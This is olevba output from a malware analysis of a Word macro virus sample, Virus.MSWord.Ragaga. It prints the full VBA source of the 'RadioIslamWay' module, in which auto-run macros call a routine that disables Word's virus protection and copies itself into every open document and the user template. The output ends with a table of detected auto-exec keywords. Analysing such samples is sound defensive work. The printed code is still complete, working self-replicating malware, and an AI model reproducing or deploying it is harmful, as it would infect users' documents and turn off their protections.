olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ragaga
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ragaga - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RadioIslamWay.bas 
in file: Virus.MSWord.Ragaga - OLE stream: 'Macros/VBA/RadioIslamWay'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
LOVE
End Sub
Sub Autoexit()
LOVE
End Sub
Sub Autoexec()
LOVE
End Sub
Sub Autonew()
LOVE
End Sub
Sub AutoOpen()
MsgBox " ãÚ ÊÍíÇÊì ãÍãÏ ÚíÏ"
LOVE
End Sub
Sub Autoclose()
LOVE
End Sub
Sub Openshell()
LOVE
End Sub
Sub LOVE()
On Error Resume Next
Options.VirusProtection = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then

Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="RadioIslamWay", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="RadioIslamWay", Object:=wdOrganizerObjectProjectItems
End If
Next a
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

